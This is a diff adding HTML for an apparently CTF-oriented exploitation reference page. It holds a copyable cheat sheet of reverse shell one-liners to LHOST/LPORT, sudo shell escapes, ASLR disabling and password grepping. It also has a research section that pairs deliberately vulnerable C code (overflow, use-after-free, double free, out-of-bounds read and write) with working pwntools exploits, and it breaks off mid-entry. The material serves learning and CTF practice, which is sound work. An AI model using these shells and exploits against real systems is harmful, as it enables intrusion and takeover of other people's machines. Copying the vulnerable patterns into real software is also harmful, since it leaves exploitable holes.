+        <div class="copy-line" data-copy="checksec --file=./binary"><span class="t-prompt">$</span> <span class="t-cmd">checksec</span> <span class="t-var">--file=./binary</span><span class="t-comment">       # check mitigations</span></div>
+        <div class="copy-line" data-copy="strings -n 8 ./binary"><span class="t-prompt">$</span> <span class="t-cmd">strings</span> <span class="t-var">-n 8 ./binary</span></div>
+        <div class="copy-line" data-copy="ltrace ./binary"><span class="t-prompt">$</span> <span class="t-cmd">ltrace</span> <span class="t-var">./binary</span><span class="t-comment">                 # trace library calls</span></div>
+        <div class="copy-line" data-copy="strace ./binary"><span class="t-prompt">$</span> <span class="t-cmd">strace</span> <span class="t-var">./binary</span><span class="t-comment">                 # trace syscalls</span></div>
+        <div class="copy-line" data-copy="readelf -h ./binary"><span class="t-prompt">$</span> <span class="t-cmd">readelf -h</span> <span class="t-var">./binary</span></div>
+        <div class="copy-line" data-copy="readelf -S ./binary"><span class="t-prompt">$</span> <span class="t-cmd">readelf -S</span> <span class="t-var">./binary</span><span class="t-comment">             # sections</span></div>
+        <div class="copy-line" data-copy="objdump -d -M intel ./binary"><span class="t-prompt">$</span> <span class="t-cmd">objdump -d -M intel</span> <span class="t-var">./binary</span></div>
+        <div class="copy-line" data-copy="ldd ./binary"><span class="t-prompt">$</span> <span class="t-cmd">ldd</span> <span class="t-var">./binary</span></div>
+        <div class="copy-line" data-copy="hexdump -C ./binary | head -40"><span class="t-prompt">$</span> <span class="t-cmd">hexdump -C</span> <span class="t-var">./binary</span> <span class="t-var">| head -40</span></div>
+      </div>
+      <div class="cheat-block" data-cat="exploit">
+        <div class="t-section"># ─── EXPLOIT DEVELOPMENT ───</div>
+        <div class="copy-line" data-copy='python3 -c "import pwn; print(pwn.cyclic(200))"'><span class="t-prompt">$</span> <span class="t-cmd">python3 -c</span> <span class="t-str">"import pwn; print(pwn.cyclic(200))"</span></div>
+        <div class="copy-line" data-copy="ROPgadget --binary ./binary --rop"><span class="t-prompt">$</span> <span class="t-cmd">ROPgadget --binary</span> <span class="t-var">./binary</span> <span class="t-var">--rop</span></div>
+        <div class="copy-line" data-copy='ROPgadget --binary ./binary --string "/bin/sh"'><span class="t-prompt">$</span> <span class="t-cmd">ROPgadget --binary</span> <span class="t-var">./binary</span> <span class="t-var">--string "/bin/sh"</span></div>
+        <div class="copy-line" data-copy="one_gadget libc.so.6"><span class="t-prompt">$</span> <span class="t-cmd">one_gadget</span> <span class="t-var">libc.so.6</span></div>
+        <div class="copy-line" data-copy="patchelf --set-interpreter ./ld.so ./binary"><span class="t-prompt">$</span> <span class="t-cmd">patchelf --set-interpreter</span> <span class="t-var">./ld.so ./binary</span></div>
+        <div class="copy-line" data-copy="echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"><span class="t-prompt">$</span> <span class="t-cmd">echo 0 | sudo tee</span> /proc/sys/kernel/randomize_va_space</div>
+        <div class="copy-line" data-copy="pwn template --host ctf.host --port 1337 ./binary"><span class="t-prompt">$</span> <span class="t-cmd">pwn template --host</span> <span class="t-var">ctf.host</span> <span class="t-var">--port 1337 ./binary</span></div>
+      </div>
+      <div class="cheat-block" data-cat="pivot">
+        <div class="t-section"># ─── PIVOTING &amp; SHELLS ───</div>
+        <div class="copy-line" data-copy="bash -i >& /dev/tcp/LHOST/LPORT 0>&1"><span class="t-prompt">$</span> <span class="t-cmd">bash -i</span> &gt;&amp; /dev/tcp/<span class="t-var">LHOST/LPORT</span> 0&gt;&amp;1</div>
+        <div class="copy-line" data-copy="nc -e /bin/sh LHOST LPORT"><span class="t-prompt">$</span> <span class="t-cmd">nc -e</span> /bin/sh <span class="t-var">LHOST LPORT</span></div>
+        <div class="copy-line" data-copy="socat TCP:LHOST:LPORT EXEC:/bin/sh"><span class="t-prompt">$</span> <span class="t-cmd">socat</span> TCP:<span class="t-var">LHOST:LPORT</span> EXEC:/bin/sh</div>
+        <div class="copy-line" data-copy="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"><span class="t-prompt">$</span> <span class="t-cmd">python3 -c</span> <span class="t-str">'import pty; pty.spawn("/bin/bash")'</span></div>
+        <div class="copy-line" data-copy="stty raw -echo; fg"><span class="t-prompt">Ctrl+Z →</span> <span class="t-cmd">stty raw -echo; fg</span></div>
+        <div class="copy-line" data-copy="export TERM=xterm-256color"><span class="t-prompt">$</span> <span class="t-cmd">export TERM=xterm-256color</span></div>
+        <div class="copy-line" data-copy="ssh -L 8080:127.0.0.1:80 user@target"><span class="t-prompt">$</span> <span class="t-cmd">ssh -L</span> <span class="t-var">8080:127.0.0.1:80 user@target</span></div>
+        <div class="copy-line" data-copy="chisel server -p 8000 --reverse"><span class="t-prompt">$</span> <span class="t-cmd">chisel server -p 8000 --reverse</span></div>
+      </div>
+      <div class="cheat-block" data-cat="files">
+        <div class="t-section"># ─── FILE MANIPULATION ───</div>
+        <div class="copy-line" data-copy="find / -perm -4000 2>/dev/null"><span class="t-prompt">$</span> <span class="t-cmd">find / -perm -4000</span> 2&gt;/dev/null<span class="t-comment"> # SUID</span></div>
+        <div class="copy-line" data-copy="find / -writable -type f 2>/dev/null"><span class="t-prompt">$</span> <span class="t-cmd">find / -writable -type f</span> 2&gt;/dev/null</div>
+        <div class="copy-line" data-copy='grep -rl "password" /etc/ 2>/dev/null'><span class="t-prompt">$</span> <span class="t-cmd">grep -rl</span> <span class="t-str">"password"</span> /etc/ 2&gt;/dev/null</div>
+        <div class="copy-line" data-copy="tar czf archive.tar.gz /path"><span class="t-prompt">$</span> <span class="t-cmd">tar czf</span> archive.tar.gz /path</div>
+        <div class="copy-line" data-copy="tar xzf archive.tar.gz"><span class="t-prompt">$</span> <span class="t-cmd">tar xzf</span> archive.tar.gz</div>
+        <div class="copy-line" data-copy="binwalk -e firmware.bin"><span class="t-prompt">$</span> <span class="t-cmd">binwalk -e</span> <span class="t-var">firmware.bin</span></div>
+        <div class="copy-line" data-copy="base64 file"><span class="t-prompt">$</span> <span class="t-cmd">base64</span> <span class="t-var">file</span></div>
+        <div class="copy-line" data-copy='base64 -d <<< "b64" > out'><span class="t-prompt">$</span> <span class="t-cmd">base64 -d</span> &lt;&lt;&lt; <span class="t-str">"b64"</span> &gt; out</div>
+      </div>
+      <div class="cheat-block" data-cat="priv">
+        <div class="t-section"># ─── PRIVILEGE ESCALATION ───</div>
+        <div class="copy-line" data-copy="sudo -l"><span class="t-prompt">$</span> <span class="t-cmd">sudo -l</span></div>
+        <div class="copy-line" data-copy="id && whoami"><span class="t-prompt">$</span> <span class="t-cmd">id &amp;&amp; whoami</span></div>
+        <div class="copy-line" data-copy="uname -a"><span class="t-prompt">$</span> <span class="t-cmd">uname -a</span></div>
+        <div class="copy-line" data-copy="getcap -r / 2>/dev/null"><span class="t-prompt">$</span> <span class="t-cmd">getcap -r /</span> 2&gt;/dev/null</div>
+        <div class="copy-line" data-copy="crontab -l"><span class="t-prompt">$</span> <span class="t-cmd">crontab -l</span></div>
+        <div class="copy-line" data-copy="sudo vim -c ':!/bin/sh'"><span class="t-prompt">$</span> <span class="t-cmd">sudo vim -c</span> <span class="t-str">':!/bin/sh'</span></div>
+        <div class="copy-line" data-copy="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"><span class="t-prompt">$</span> <span class="t-cmd">sudo python3 -c</span> <span class="t-str">'import os; os.system("/bin/sh")'</span></div>
+        <div class="copy-line" data-copy="sudo find . -exec /bin/sh \; -quit"><span class="t-prompt">$</span> <span class="t-cmd">sudo find . -exec</span> /bin/sh \; <span class="t-var">-quit</span></div>
+        <div class="copy-line" data-copy="sudo awk 'BEGIN {system(\"/bin/sh\")}'"><span class="t-prompt">$</span> <span class="t-cmd">sudo awk</span> <span class="t-str">'BEGIN {system("/bin/sh")}'</span></div>
+      </div>
+      <div class="cheat-block" data-cat="gdb">
+        <div class="t-section"># ─── GDB ───</div>
+        <div class="copy-line" data-copy="gdb -q --args ./binary arg1"><span class="t-prompt">$</span> <span class="t-cmd">gdb -q --args</span> <span class="t-var">./binary arg1</span></div>
+        <div class="copy-line" data-copy="run < input.txt"><span class="t-prompt">(gdb)</span> <span class="t-cmd">run</span> &lt; input.txt</div>
+        <div class="copy-line" data-copy="break *0x401234"><span class="t-prompt">(gdb)</span> <span class="t-cmd">break *0x401234</span></div>
+        <div class="copy-line" data-copy="x/20gx $rsp"><span class="t-prompt">(gdb)</span> <span class="t-cmd">x/20gx $rsp</span></div>
+        <div class="copy-line" data-copy="x/s 0x402100"><span class="t-prompt">(gdb)</span> <span class="t-cmd">x/s 0x402100</span></div>
+        <div class="copy-line" data-copy="info registers"><span class="t-prompt">(gdb)</span> <span class="t-cmd">info registers</span></div>
+        <div class="copy-line" data-copy="info proc mappings"><span class="t-prompt">(gdb)</span> <span class="t-cmd">info proc mappings</span></div>
+        <div class="copy-line" data-copy="set $rip = 0x401234"><span class="t-prompt">(gdb)</span> <span class="t-cmd">set $rip = 0x401234</span></div>
+        <div class="copy-line" data-copy="disassemble main"><span class="t-prompt">(gdb)</span> <span class="t-cmd">disassemble main</span></div>
+      </div>
+      <div class="cheat-block" data-cat="pwndbg">
+        <div class="t-section"># ─── PWNDBG ───</div>
+        <div class="copy-line" data-copy="context"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">context</span></div>
+        <div class="copy-line" data-copy="stack 20"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">stack 20</span></div>
+        <div class="copy-line" data-copy="heap"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">heap</span></div>
+        <div class="copy-line" data-copy="bins"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">bins</span></div>
+        <div class="copy-line" data-copy="tcache"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">tcache</span></div>
+        <div class="copy-line" data-copy="got"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">got</span></div>
+        <div class="copy-line" data-copy="vmmap"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">vmmap</span></div>
+        <div class="copy-line" data-copy='search -s "/bin/sh"'><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">search -s</span> <span class="t-str">"/bin/sh"</span></div>
+        <div class="copy-line" data-copy="telescope $rsp 20"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">telescope $rsp 20</span></div>
+        <div class="copy-line" data-copy="cyclic 200"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">cyclic 200</span></div>
+        <div class="copy-line" data-copy="cyclic -l 0x6161616c"><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">cyclic -l 0x6161616c</span></div>
+        <div class="copy-line" data-copy='rop --grep "pop rdi"'><span class="t-prompt">(pwndbg)</span> <span class="t-cmd">rop --grep</span> <span class="t-str">"pop rdi"</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="encoder-wrap">
+    <div class="encoder-title">⚡ Encoder / Decoder Tool</div>
+    <div class="enc-row">
+      <span class="enc-label">Input</span>
+      <input class="enc-input" id="enc-in" placeholder="text, 0x hex, or 0b binary..." oninput="runEncoder()">
+      <button style="background:transparent;border:1px solid var(--border);color:var(--green-dim);font-family:'Share Tech Mono',monospace;font-size:.65rem;letter-spacing:1px;padding:.4rem .8rem;cursor:pointer;text-transform:uppercase;" onclick="document.getElementById('enc-in').value='';runEncoder()" onmouseover="this.style.borderColor='var(--green)';this.style.color='var(--green)'" onmouseout="this.style.borderColor='var(--border)';this.style.color='var(--green-dim)'">CLEAR</button>
+    </div>
+    <div class="enc-output-grid">
+      <div class="enc-out" onclick="copyEnc('enc-ascii')"><div class="enc-out-label">ASCII / UTF-8 <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-ascii">—</div></div>
+      <div class="enc-out" onclick="copyEnc('enc-hex')"><div class="enc-out-label">Hex <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-hex">—</div></div>
+      <div class="enc-out" onclick="copyEnc('enc-bin')"><div class="enc-out-label">Binary <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-bin">—</div></div>
+      <div class="enc-out" onclick="copyEnc('enc-b64')"><div class="enc-out-label">Base64 <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-b64">—</div></div>
+      <div class="enc-out" onclick="copyEnc('enc-dec')"><div class="enc-out-label">Decimal bytes <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-dec">—</div></div>
+      <div class="enc-out" onclick="copyEnc('enc-rot')"><div class="enc-out-label">ROT13 <span style="opacity:.4">⧉</span></div><div class="enc-out-val" id="enc-rot">—</div></div>
+    </div>
+  </div>
+</section>
+<hr class="divider">
+
+<!-- 04 RESEARCH -->
+<section id="examples">
+  <div class="section-header"><span class="section-num">04</span><span class="section-title">Research</span><div class="section-line"></div></div>
+  <p style="color:var(--text-dim);font-size:.8rem;margin-bottom:1.5rem;border-left:2px solid var(--green);padding-left:1rem;">Each entry contains the vulnerable C pattern and a working pwntools exploit. All content is for educational and research purposes.</p>
+  <div class="ex-filter">
+    <button class="ex-btn active" onclick="filterEx('all',this)">ALL</button>
+    <button class="ex-btn" onclick="filterEx('stack',this)">STACK</button>
+    <button class="ex-btn" onclick="filterEx('heap',this)">HEAP</button>
+    <button class="ex-btn" onclick="filterEx('mem',this)">MEMORY</button>
+    <button class="ex-btn" onclick="filterEx('rop',this)">ROP</button>
+  </div>
+  <div class="ex-grid">
+
+    <!-- BUFFER OVERFLOW -->
+    <div class="ex-card" data-excat="stack">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type stack">STACK</span><span class="ex-title">Buffer Overflow</span><span class="ex-lang">C · x86_64</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body open"><div class="ex-body-inner">
+        <div class="ex-desc">Writing past the end of a fixed-size stack buffer overwrites adjacent memory — including the saved return address. Controlling RIP gives an attacker code execution.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-comment">// gcc -o bof bof.c -fno-stack-protector -no-pie</span>
+<span class="c-kw">#include</span> <span class="c-str">&lt;stdio.h&gt;</span>
+<span class="c-kw">void</span> <span class="c-fn">win</span>() { puts(<span class="c-str">"shell!"</span>); }
+<span class="c-kw">void</span> <span class="c-fn">vuln</span>() {
+    <span class="c-kw">char</span> buf[<span class="c-num">64</span>];
+    <span class="c-fn">gets</span>(buf);      <span class="c-bug">// BUG: no length check</span>
+    <span class="c-comment">// buf[72..79] = saved RIP  ← attacker controls</span>
+}
+<span class="c-kw">int</span> <span class="c-fn">main</span>() { <span class="c-fn">vuln</span>(); }</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline critical">CRITICAL</span><div class="poc-meta-inline">x86_64 · no-pie · no canary · NX off</div><div class="poc-desc-inline">Overflow the 64-byte buffer, pad to saved RIP at offset 72, overwrite with the address of win().</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+elf = ELF('./bof', checksec=False)
+p   = process('./bof')
+WIN    = elf.sym['win']
+OFFSET = 72          # 64-byte buf + 8-byte saved RBP
+payload  = b'A' * OFFSET
+payload += p64(WIN)
+p.sendline(payload)
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- USE-AFTER-FREE -->
+    <div class="ex-card" data-excat="heap">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type heap">HEAP</span><span class="ex-title">Use-After-Free (UAF)</span><span class="ex-lang">C · glibc</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">A pointer is used after its memory has been freed. If an attacker reclaims that chunk with controlled data before the stale pointer is dereferenced, they control reads or function calls.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">typedef struct</span> { <span class="c-kw">char</span> name[<span class="c-num">32</span>]; <span class="c-kw">void</span>(*<span class="c-fn">greet</span>)(); } User;
+<span class="c-kw">void</span> <span class="c-fn">hello</span>()    { puts(<span class="c-str">"hello!"</span>); }
+<span class="c-kw">void</span> <span class="c-fn">backdoor</span>() { system(<span class="c-str">"/bin/sh"</span>); }
+<span class="c-kw">int</span> <span class="c-fn">main</span>() {
+    User *u = <span class="c-fn">malloc</span>(<span class="c-kw">sizeof</span>(User));
+    u->greet = hello;
+    <span class="c-fn">free</span>(u);                <span class="c-comment">// chunk → tcache</span>
+    <span class="c-kw">char</span> *evil = <span class="c-fn">malloc</span>(<span class="c-kw">sizeof</span>(User));
+    *(<span class="c-kw">void</span>(**)()){evil+<span class="c-num">32</span>} = backdoor;
+    u-><span class="c-fn">greet</span>();  <span class="c-bug">// BUG: stale ptr → calls backdoor()</span>
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline critical">CRITICAL</span><div class="poc-meta-inline">x86_64 · glibc tcache · no PIE · NX enabled</div><div class="poc-desc-inline">Free the User chunk, reclaim it with controlled data overwriting the function pointer at offset 32, then trigger the call through the stale pointer.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+elf = ELF('./uaf_target', checksec=False)
+p   = process('./uaf_target')
+BACKDOOR  = elf.sym['backdoor']
+FNPTR_OFF = 32
+def alloc(name):  p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'name: ', name)
+def free_user():  p.sendlineafter(b'> ', b'2')
+def call_greet(): p.sendlineafter(b'> ', b'3')
+alloc(b'legit')
+free_user()
+fake  = b'B' * FNPTR_OFF + p64(BACKDOOR)
+alloc(fake)
+call_greet()
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- DOUBLE FREE -->
+    <div class="ex-card" data-excat="heap">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type heap">HEAP</span><span class="ex-title">Double Free</span><span class="ex-lang">C · glibc tcache</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">Freeing the same pointer twice corrupts the tcache free-list into a loop. Poisoning the fd pointer redirects the next malloc() to an arbitrary address — arbitrary write primitive.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">int</span> <span class="c-fn">main</span>() {
+    <span class="c-kw">void</span> *a = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);
+    <span class="c-kw">void</span> *b = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);
+    <span class="c-fn">free</span>(a); <span class="c-fn">free</span>(b);
+    <span class="c-fn">free</span>(a);  <span class="c-bug">// BUG: double free → tcache: a→b→a</span>
+    <span class="c-kw">void</span> *c = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);   <span class="c-comment">// returns a</span>
+    <span class="c-kw">void</span> *d = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);   <span class="c-comment">// returns b</span>
+    *(<span class="c-kw">void</span>**)c = (<span class="c-kw">void</span>*)<span class="c-num">0xdeadbeef</span>;
+    <span class="c-kw">void</span> *e = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);
+    <span class="c-kw">void</span> *f = <span class="c-fn">malloc</span>(<span class="c-num">0x28</span>);  <span class="c-bug">// → 0xdeadbeef</span>
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline critical">CRITICAL</span><div class="poc-meta-inline">x86_64 · glibc 2.31 · tcache · no PIE</div><div class="poc-desc-inline">Double-free to create a tcache loop, poison the fd pointer to target __free_hook, write system() there, then free a chunk containing "/bin/sh".</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+elf  = ELF('./dfree', checksec=False)
+libc = ELF('./libc-2.31.so', checksec=False)
+p    = process('./dfree')
+# (obtain libc base from a prior puts() leak)
+free_hook = libc.sym['__free_hook']
+system    = libc.sym['system']
+def alloc(data): p.sendlineafter(b'> ', b'1'); p.sendlineafter(b': ', data)
+def free(idx):   p.sendlineafter(b'> ', b'2'); p.sendlineafter(b': ', str(idx).encode())
+def write(idx, data): p.sendlineafter(b'> ', b'3'); p.sendlineafter(b': ', str(idx).encode()); p.sendlineafter(b': ', data)
+alloc(b'A'*0x28); alloc(b'B'*0x28)
+free(0); free(1); free(0)       # double free
+write(0, p64(free_hook))        # poison fd → __free_hook
+alloc(b'C'*0x28); alloc(b'D'*0x28)
+alloc(p64(system))              # write system() to __free_hook
+alloc(b'/bin/sh\x00')
+free(5)                         # free("/bin/sh") → system("/bin/sh")
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- MEMORY LEAK -->
+    <div class="ex-card" data-excat="mem">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type mem">MEMORY</span><span class="ex-title">Memory Leak</span><span class="ex-lang">C · heap</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">Allocated memory never freed accumulates over time, exhausting the process heap. In privileged long-running processes stale buffers may also expose sensitive data.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">char</span> *<span class="c-fn">get_token</span>(<span class="c-kw">const char</span> *in) {
+    <span class="c-kw">char</span> *buf = <span class="c-fn">malloc</span>(<span class="c-num">256</span>);  <span class="c-comment">// new alloc every call</span>
+    <span class="c-fn">snprintf</span>(buf, <span class="c-num">256</span>, <span class="c-str">"TOKEN:%s"</span>, in);
+    <span class="c-kw">return</span> buf;
+}
+<span class="c-kw">int</span> <span class="c-fn">main</span>() {
+    <span class="c-kw">for</span> (<span class="c-kw">int</span> i=<span class="c-num">0</span>; i&lt;<span class="c-num">1000000</span>; i++) {
+        <span class="c-kw">char</span> *t = <span class="c-fn">get_token</span>(<span class="c-str">"session"</span>);
+        <span class="c-fn">printf</span>(<span class="c-str">"%s\n"</span>, t);
+        <span class="c-bug">// BUG: t never freed — 256 B per iteration</span>
+    }
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline medium">MEDIUM</span><div class="poc-meta-inline">DoS · heap exhaustion · stale data disclosure</div><div class="poc-desc-inline">Flood the allocator to exhaust heap (DoS) and observe stale malloc() data leaking sensitive content from prior allocations.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+# Detect with: valgrind --leak-check=full ./memleak
+from pwn import *
+p = process('./memleak_server')
+for i in range(500000):
+    p.sendlineafter(b'> ', b'alloc')
+    line = p.recvline()
+    if b'SECRET' in line or b'KEY' in line:
+        log.success(f'Stale data at iter {i}: {line}')
+        break
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- OOB READ -->
+    <div class="ex-card" data-excat="mem">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type mem">MEMORY</span><span class="ex-title">Out-of-Bounds Read</span><span class="ex-lang">C · info leak</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">Reading beyond a buffer leaks adjacent memory — stack canaries, pointers, ASLR offsets, or cryptographic keys. Classic stage-1 primitive used before a write-based follow-up.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">void</span> <span class="c-fn">echo</span>(<span class="c-kw">uint8_t</span> *data, <span class="c-kw">size_t</span> claimed_len) {
+    <span class="c-kw">uint8_t</span> secret[<span class="c-num">8</span>] = {<span class="c-num">0xde</span>,<span class="c-num">0xad</span>,<span class="c-num">0xbe</span>,<span class="c-num">0xef</span>,<span class="c-num">0xca</span>,<span class="c-num">0xfe</span>,<span class="c-num">0xba</span>,<span class="c-num">0xbe</span>};
+    <span class="c-kw">uint8_t</span> buf[<span class="c-num">16</span>];
+    <span class="c-fn">memcpy</span>(buf, data, <span class="c-num">4</span>);
+    <span class="c-comment">// BUG: claimed_len > 16 reads secret[] and beyond</span>
+    <span class="c-kw">for</span> (<span class="c-kw">size_t</span> i=<span class="c-num">0</span>; i&lt;<span class="c-bug">claimed_len</span>; i++)
+        <span class="c-fn">printf</span>(<span class="c-str">"%02x "</span>, buf[i]);  <span class="c-bug">// OOB when i >= 16</span>
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline high">HIGH</span><div class="poc-meta-inline">x86_64 · ASLR bypass primitive · canary leak</div><div class="poc-desc-inline">Send 4 real bytes but claim 256. The server echoes 256 bytes from the stack — leaking the canary, saved RBP, saved RIP, and libc addresses needed for a full exploit.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+p = remote('ctf.target.com', 1337)
+p.sendlineafter(b'len: ', b'256')
+p.sendlineafter(b'data: ', b'\x48\x49\x00\x00')
+leak_bytes = bytes(int(x,16) for x in p.recvline().split())
+log.info(f'Leak ({len(leak_bytes)}B): {leak_bytes.hex()}')
+# Stack offsets (adjust per target):
+canary    = u64(leak_bytes[24:32])
+saved_rip = u64(leak_bytes[40:48])
+log.success(f'canary    = {hex(canary)}')
+log.success(f'saved_rip = {hex(saved_rip)}')</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- OOB WRITE -->
+    <div class="ex-card" data-excat="stack">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type stack">STACK</span><span class="ex-title">Out-of-Bounds Write</span><span class="ex-lang">C · stack/heap</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">Writing beyond a buffer corrupts adjacent memory — canary or RIP on stack, metadata or objects on heap. Classic BSS variable overwrite when adjacent globals are in scope.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">int</span> authenticated = <span class="c-num">0</span>;   <span class="c-comment">// BSS — adjacent to buf</span>
+<span class="c-kw">void</span> <span class="c-fn">login</span>(<span class="c-kw">const char</span> *username) {
+    <span class="c-kw">char</span> buf[<span class="c-num">8</span>];
+    <span class="c-fn">strcpy</span>(<span class="c-bug">buf</span>, username);  <span class="c-bug">// BUG: no length limit</span>
+}
+<span class="c-kw">int</span> <span class="c-fn">main</span>() {
+    <span class="c-fn">login</span>(<span class="c-str">"AAAAAAAAAAAAAAAA"</span>);
+    <span class="c-kw">if</span> (authenticated) puts(<span class="c-str">"access granted"</span>);
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline high">HIGH</span><div class="poc-meta-inline">x86_64 · BSS overwrite · no canary</div><div class="poc-desc-inline">Overflow the 8-byte buffer to overwrite the adjacent authenticated integer. A non-zero value bypasses the check without valid credentials.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+p = process('./oob_write')
+OFFSET = 8          # buf[8], authenticated immediately follows
+payload  = b'A' * OFFSET
+payload += p32(1)   # authenticated = 1
+p.sendlineafter(b'username: ', payload)
+p.interactive()     # expect: "access granted"</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- DANGLING POINTER -->
+    <div class="ex-card" data-excat="heap">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type heap">HEAP</span><span class="ex-title">Dangling Pointer</span><span class="ex-lang">C · heap</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">A pointer that still holds the address of freed memory. Any future allocation can reclaim that region, making later dereferences controlled by an attacker.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">typedef struct</span> { <span class="c-kw">int</span> id; <span class="c-kw">int</span> priv_level; } Session;
+Session *active;
+<span class="c-kw">void</span> <span class="c-fn">logout</span>() {
+    <span class="c-fn">free</span>(active);
+    <span class="c-bug">// BUG: active not set to NULL — dangling pointer</span>
+}
